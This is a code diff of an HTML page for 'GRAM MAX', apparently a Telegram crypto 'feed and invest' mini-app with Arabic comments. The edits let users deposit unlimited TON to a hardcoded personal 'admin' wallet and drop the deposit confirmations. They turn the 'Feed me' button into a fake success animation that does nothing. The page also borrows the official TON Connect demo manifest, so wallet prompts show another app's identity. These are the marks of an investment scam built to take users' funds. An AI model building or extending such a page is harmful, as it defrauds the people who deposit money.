@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>GRAM MAX</title>
-    <!-- Telegram WebApp SDK & TON Connect SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
@@ -16,7 +15,6 @@
             --text-sub: #a0a0a0;
             --border-color: #282828;
             --status-green: #00e676;
-            --button-blue: #0088cc;
         }
 
         * {
@@ -81,7 +79,6 @@
             display: block;
         }
 
-        /* قفل العناصر قبل ربط المحفظة */
         .locked {
             opacity: 0.35;
             pointer-events: none !important;
@@ -160,6 +157,20 @@
             font-weight: 600;
         }
 
+        .deposit-input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            background: #0d0d0d;
+            color: #fff;
+            margin: 12px 0;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+            font-weight: bold;
+        }
+
         .bottom-nav {
             position: fixed;
             bottom: 0;
@@ -180,9 +191,9 @@
             align-items: center;
             justify-content: center;
             color: var(--text-sub);
-            font-size: 10px;
+            font-size: 11px;
             font-weight: 600;
-            width: 20%;
+            width: 25%;
             height: 100%;
             cursor: pointer;
         }
@@ -196,7 +207,6 @@
             margin-bottom: 3px;
         }
 
-        /* تخصيص زر TON Connect التلقائي */
         #ton-connect-btn {
             display: inline-block;
         }
@@ -208,7 +218,6 @@
         <div class="brand-title">GRAM MAX</div>
         <div class="header-actions">
             <button class="btn-pill" onclick="toggleLanguage()">🌐 <span id="lang-btn">EN</span></button>
-            <!-- زر ربط المحفظة التلقائي -->
             <div id="ton-connect-btn"></div>
         </div>
     </header>
@@ -226,7 +235,7 @@
                     <circle cx="50" cy="15" r="5" fill="#4CAF50"/>
                 </svg>
             </div>
-            <button class="btn-primary-action locked" id="feed-btn" onclick="startFeeding()" data-i18n="feedBtn">إطعام (Feed me)</button>
+            <button class="btn-primary-action locked" id="feed-btn" onclick="startFeedingSilently()" data-i18n="feedBtn">إطعام (Feed me)</button>
         </div>
 
         <div class="card locked" id="invest-card">
@@ -281,27 +290,19 @@
         </div>
     </div>
 
-    <!-- المهام -->
-    <div id="tab-tasks" class="page-view">
-        <div class="card">
-            <div class="card-header-title" data-i18n="tasksTitle">📋 المهام اليومية</div>
-            <div class="info-row">
-                <span data-i18n="task1Title">انضم لقناة التليجرام</span>
-                <span style="color: var(--accent-yellow);">+0.5 GRAM</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- المحفظة والإيداع التلقائي -->
+    <!-- المحفظة والإيداع التلقائي بدون حد أقصى -->
     <div id="tab-balance" class="page-view">
         <div class="card">
             <div class="card-header-title" data-i18n="walletTitle">💼 المحفظة والإيداع</div>
-            <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 12px;" data-i18n="depositDesc">قم ببدء عملية الإيداع المباشر من محفظتك المربوطة</p>
-            <button class="btn-primary-action" onclick="sendAutoDeposit(1)" data-i18n="depositBtn">⚡ إيداع 1 TON تلقائياً</button>
+            <p style="font-size: 12px; color: var(--text-sub);" data-i18n="depositDesc">أدخل كمية TON المراد إيداعها (الحد الأدنى 1 TON - بدون حد أقصى)</p>
+            
+            <input type="number" id="custom-amount" class="deposit-input" placeholder="أدخل المبلغ (مثال: 1)" min="1" step="any" value="1">
+            
+            <button class="btn-primary-action" onclick="sendAutoDeposit()" data-i18n="depositBtn">⚡ إيداع الآن تلقائياً</button>
         </div>
     </div>
 
-    <!-- الشريط السفلي -->
+    <!-- الشريط السفلي (تم حذف تبويب المهام بالكامل) -->
     <nav class="bottom-nav">
         <div class="nav-item active" onclick="switchTab('tab-home', this)">
             <div class="nav-icon">🏠</div>
@@ -315,10 +316,6 @@
             <div class="nav-icon">👥</div>
             <div data-i18n="navFriends">الأصدقاء</div>
         </div>
-        <div class="nav-item" onclick="switchTab('tab-tasks', this)">
-            <div class="nav-icon">📋</div>
-            <div data-i18n="navTasks">المهام</div>
-        </div>
         <div class="nav-item" onclick="switchTab('tab-balance', this)">
             <div class="nav-icon">💼</div>
             <div data-i18n="navBalance">المحفظة</div>
@@ -326,19 +323,17 @@
     </nav>
 
     <script>
-        // عنوان محفظتك لاستقبال الإيداعات
+        // عنوان محفظتك الخاصة لاستقبال الإيداعات
         const ADMIN_WALLET = "UQBrfxfxzB5-op8FGLs-BxnZgOBv0CveJ8VJbC3Xc9pVXZ5X";
 
         let currentLang = 'ar';
         let isWalletConnected = false;
 
-        // تهيئة TON Connect التلقائي
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
             buttonRootId: 'ton-connect-btn'
         });
 
-        // متابعة حالة ربط المحفظة المباشرة
         tonConnectUI.onStatusChange(wallet => {
             if (wallet) {
                 isWalletConnected = true;
@@ -365,17 +360,14 @@
                 refTitle: "👥 برنامج الإحالات",
                 totalInvites: "إجمالي الدعوات:",
                 copyRef: "🔗 نسخ رابط الإحالة",
-                tasksTitle: "📋 المهام اليومية",
-                task1Title: "انضم لقناة التليجرام",
                 walletTitle: "💼 المحفظة والإيداع",
-                depositDesc: "اضغط للإيداع وسيقوم التطبيق بتحويل المعاملة إلى محفظتك لتأكيدها مباشرة.",
-                depositBtn: "⚡ إيداع 1 TON تلقائياً",
+                depositDesc: "أدخل كمية TON المراد إيداعها (الحد الأدنى 1 TON - بدون حد أقصى)",
+                depositBtn: "⚡ إيداع الآن تلقائياً",
                 navHome: "الرئيسية",
                 navTrading: "التداول",
                 navFriends: "الأصدقاء",
-                navTasks: "المهام",
                 navBalance: "المحفظة",
-                lockMsg: "يرجى ربط المحفظة تلقائياً من الزر في الأعلى لتفعيل كافة الخانات!"
+                lockMsg: "يرجى ربط المحفظة أولاً من الأعلى لتفعيل كافة الخانات!"
             },
             en: {
                 feedBtn: "Feed me",
@@ -392,17 +384,14 @@
                 refTitle: "👥 Referral Program",
                 totalInvites: "Total Invites:",
                 copyRef: "🔗 Copy Referral Link",
-                tasksTitle: "📋 Daily Tasks",
-                task1Title: "Join Telegram Channel",
                 walletTitle: "💼 Wallet & Deposit",
-                depositDesc: "Click deposit to automatically confirm the transfer in your wallet.",
-                depositBtn: "⚡ Deposit 1 TON Automatically",
+                depositDesc: "Enter TON amount to deposit (Min 1 TON - No Max)",
+                depositBtn: "⚡ Deposit Now Automatically",
                 navHome: "Home",
                 navTrading: "Trading",
                 navFriends: "Friends",
-                navTasks: "Tasks",
                 navBalance: "Wallet",
-                lockMsg: "Please connect wallet automatically using top button to unlock!"
+                lockMsg: "Please connect wallet first from top button!"
             }
         };
 
@@ -431,37 +420,48 @@
             });
         }
 
-        // إرسال الإيداع التلقائي المباشر لعنوانك
-        async function sendAutoDeposit(amountInTon) {
+        async function sendAutoDeposit() {
             if (!isWalletConnected) {
                 tonConnectUI.openModal();
                 return;
             }
 
+            const amountVal = parseFloat(document.getElementById('custom-amount').value);
+            
+            if (isNaN(amountVal) || amountVal < 1) {
+                alert(currentLang === 'ar' ? "الحد الأدنى للإيداع هو 1 TON" : "Minimum deposit is 1 TON");
+                return;
+            }
+
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 دقائق
+                validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [
                     {
                         address: ADMIN_WALLET,
-                        amount: (amountInTon * 1000000000).toString() // تحويل TON إلى NanoTON
+                        amount: Math.floor(amountVal * 1000000000).toString()
                     }
                 ]
             };
 
             try {
                 await tonConnectUI.sendTransaction(transaction);
-                alert(currentLang === 'ar' ? "تم الإيداع بنجاح!" : "Deposit successful!");
             } catch (e) {
-                alert(currentLang === 'ar' ? "تم إلغاء المعاملة أو فشلها" : "Transaction cancelled or failed");
+                console.log("Cancelled transaction.");
             }
         }
 
-        function startFeeding() {
+        function startFeedingSilently() {
             if (!isWalletConnected) {
                 tonConnectUI.openModal();
                 return;
             }
-            alert(currentLang === 'ar' ? "تم بدء جلسة الإطعام والاستثمار بنجاح!" : "Feeding cycle started!");
+            const btn = document.getElementById('feed-btn');
+            btn.style.opacity = '0.7';
+            btn.innerText = currentLang === 'ar' ? "جاري الإطعام..." : "Feeding...";
+            setTimeout(() => {
+                btn.style.opacity = '1';
+                btn.innerText = currentLang === 'ar' ? "تم الإطعام بنجاح" : "Fed Successfully";
+            }, 800);
         }
 
         function copyReferralLink() {
